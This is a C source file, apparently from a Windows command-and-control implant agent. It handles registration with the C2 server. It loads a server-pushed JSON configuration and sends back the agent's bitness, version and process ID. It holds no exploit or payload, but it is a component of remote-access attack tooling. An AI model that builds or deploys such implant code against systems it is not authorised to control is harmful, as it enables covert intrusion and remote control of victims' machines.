#include <stdint.h>
#include <direct.h>
#include <process.h>
#include <string.h>
#include <io.h>
#include <errno.h>
#include "cJSON.h"
#include "agent_session.h"
#include "agent_protocol.h"
#include "agent_utility.h"
#include "agent_config.h"
#include "agent_shell.h"
#include "agent_commands.h"

static cJSON* get_registration_info() {
	cJSON* registration_info = cJSON_CreateObject();
	if (!registration_info) goto fail;
	
	// add bitness
	cJSON* jbitness = cJSON_CreateString(sizeof(void*) == 4 ? "x86" : "x64");
	if (!jbitness) goto fail;
	if (!cJSON_AddItemToObject(registration_info, "bitness", jbitness)) goto fail;

	// add version
	cJSON* jversion = cJSON_CreateString(AGENT_VERSION);
	if (!jversion) goto fail;
	if (!cJSON_AddItemToObject(registration_info, "version", jversion)) goto fail;

	// add process ID
	cJSON* jpid = cJSON_CreateNumber(getpid());
	if (!jpid) goto fail;
	if (!cJSON_AddItemToObject(registration_info, "pid", jpid)) goto fail;

	return registration_info;

fail:
	if (registration_info) cJSON_Delete(registration_info);
	return ZERO(cJSON);
}

bool load_config(session* sess, packet* pck) {	
	// zero out current server
	if (sess->active_server) {
		cJSON_Delete(sess->active_server);
		sess->active_server = ZERO(cJSON);
	}
	
	cJSON_Delete(sess->config);	
	char* tmp = MEM_ALLOC(pck->data_size + 1);
	if (!tmp) goto fail;
	memcpy(tmp, pck->data, pck->data_size);
	sess->config = cJSON_Parse(tmp);
	FREE(tmp);

	// refresh session
	if (!session_refresh(sess)) goto fail;

	return true;
fail:
	FREE(tmp);
	return false;
}

/*
	Handle the C2 registration message containing the full configuration
*/
bool regist_agent(session* sess, packet* pck) {
	// read received configuration from server
	load_config(sess, pck);
	sess->is_established = false;

	// create the agent info json string
	cJSON* registration_info = ZERO(cJSON);
	char* str_registration_info = ZERO(char);

	registration_info = get_registration_info();
	if (!registration_info) goto fail;
	str_registration_info = cJSON_Print(registration_info);
	if (!str_registration_info) goto fail;

	// send the agent json string.	
	message* msg = message_create(sess);
	if (!msg) goto fail;
	if (!message_add_request_data(
		msg,
		strlen(str_registration_info) + 1,
		str_registration_info,
		pck->id,
		0,
		REQUEST_COMMANDDATA,
		PACKET_STATE_NO_MORE_PACKETS,
		false
	)) goto fail;
	if (!message_send(sess, msg)) goto fail;
	sess->is_established = true;

	// free resources	
	message_free(msg);
	FREE(str_registration_info);
	cJSON_Delete(registration_info);	
	return true;
fail:	
	if (msg) message_free(msg);
	if (registration_info) cJSON_Delete(registration_info);
	FREE(str_registration_info);
	return false;
}